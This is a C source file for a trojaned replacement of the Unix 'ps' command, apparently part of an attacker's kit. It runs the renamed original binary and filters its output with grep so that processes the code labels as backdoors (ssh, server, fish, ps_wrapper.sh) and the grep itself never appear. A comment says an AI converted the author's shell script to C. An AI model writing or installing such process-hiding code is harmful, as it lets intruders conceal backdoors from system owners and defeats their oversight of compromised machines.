#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// Full disclaimer, I just had a generative AI convert my shell script to C.
// This is so that we can actually mask the old /bin/ps
int main() {
    // Array of backdoor programs to exclude
    const char *BACKDOOR_PROGS[] = {"ssh", "server", "fish", "grep", "ps_wrapper.sh"};
    const int num_patterns = sizeof(BACKDOOR_PROGS) / sizeof(BACKDOOR_PROGS[0]);

    // Command to execute
    char cmd[1024] = "oldps";

    // Build the grep command
    for (int i = 0; i < num_patterns; i++) {
        // Append each pattern to the command
        snprintf(cmd + strlen(cmd), sizeof(cmd) - strlen(cmd), " | grep -v '%s'", BACKDOOR_PROGS[i]);
    }

    // Execute the command
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        perror("popen failed");
        return 1;
    }

    // Read and output the command results
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("%s", buffer);
    }

    // Close the pipe
    pclose(fp);
    return 0;
}